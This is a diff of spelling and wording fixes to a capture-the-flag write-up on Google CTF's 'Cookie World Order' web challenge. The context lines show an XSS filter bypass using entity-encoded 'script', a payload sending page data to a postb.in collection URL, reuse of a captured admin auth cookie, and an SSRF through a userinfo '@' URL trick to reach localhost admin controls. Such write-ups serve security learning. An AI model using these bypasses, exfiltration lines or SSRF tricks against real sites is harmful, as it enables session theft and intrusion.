@@ -10,9 +10,9 @@ Cookie World Order (**web**)
     members of the cWo. Go forth and attain greater access to reach 
     this creature!
 
-Similarly with day 3 web problem case, we have a URL: https://cwo-xss.web.ctfcompetition.com/
+Similarly with day 3 web problem case, we have URL: https://cwo-xss.web.ctfcompetition.com/
 
-Opening it and observing very similar page with Admin and field for 
+Open it and observe very similar page with Admin entity and field for 
 input some text message.
 
 Trying to copy-paste previous solution:
@@ -23,13 +23,13 @@ Trying to copy-paste previous solution:
     </script>
 
 leads to reply "HACKER ALERT!".
-After typing different string it comes out that input must not contain 
+After typing different strings it comes out that input must not contain 
 `script` or `alert` as a substring. Well, modern WEB is full of tricks 
 and wistles. If you (like me) have no expirience with web programming, 
-Googling can conpensate it. Just request something like "bypassing XSS 
+Googling can compensate it. Just request something like "bypassing XSS 
 filter".
 
-Our first:
+First try:
 
     <scrip&#0000116>
     aler&#0000116('XSS');
@@ -83,12 +83,12 @@ Ok, the flag is
 
 
 But what could we see in Admin panel with his auth token? Open 
-WenConsole, do
+WebConsole, do
 
     document.cookie="auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"
 
 and click on "Admin" link. What we have here... Users and Livestreams 
-seems are not working. Camera Controls say requests are allowed only 
+seems empty. Camera Controls says requests are allowed only 
 from 127.0.0.1 (localhost). Maybe those HeadlessChrome-bot is on the 
 same host with server? Let's try to see how bot renders this page:
 
@@ -97,7 +97,7 @@ same host with server? Let's try to see how bot renders this page:
           var img=new Image();img.src='https://postb.in/1561495316858-4828648881521?'+data;
     });">
 
-Bad luck, he see the same message:
+Bad luck, he sees the same message:
 
     GET /1561495316858-4828648881521 2019-06-25T21:03:13.407Z
     Headers
@@ -119,7 +119,7 @@ Bad luck, he see the same message:
         Requests only accepted from 127.0.0.1: 
 
 After some lurking on the main page we can see strange thing: video is 
-viewed with url `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm`
+linked with url `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm`
 
 Why does it refer to the file with absolute path (and with no TLS)? Can 
 this page show us any file all over the world? Try:
@@ -129,21 +129,23 @@ this page show us any file all over the world? Try:
 
 Ok then, it seems like server checks that requested page path starts 
 with `http://cwo-xss.web.ctfcompetition.com`. In fact this check does 
-not guarantee that URL's hostname in `cwo-xss.web.ctfcompetition.com`, 
-because the full URI specification (RFC3986) stetes that after scheme 
-(`http`), colon and two slashes goes *authority*, which has format:
+not guarantee that URL's hostname is `cwo-xss.web.ctfcompetition.com`, 
+because the full URI specification (RFC3986) states that after scheme 
+(`http`), colon and two slashes goes *authority*, which has following 
+format:
 
     [ userinfo "@" ] host [ ":" port ]
 
 Thus we can use string `cwo-xss.web.ctfcompetition.com` as userinfo.
 Actually we can append to it any additional characters, uncluding fake 
-"password" for authentification (that hopefully will not needed). What 
+"password" for authentification (which hopefully will not needed). What 
 is important is to add "@" character. After it we can add any host and 
 port. Let's try:
 
-    https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com:passw0rd@google.ru
+    https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com:passw0rd@google.com
 
-Yes, we did it! Cross fingers and request admin controls:
+Yes, we did it, we have free http proxy!
+Cross fingers and request admin controls:
 
     https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com:passw0rd@127.0.0.1/admin/controls
 
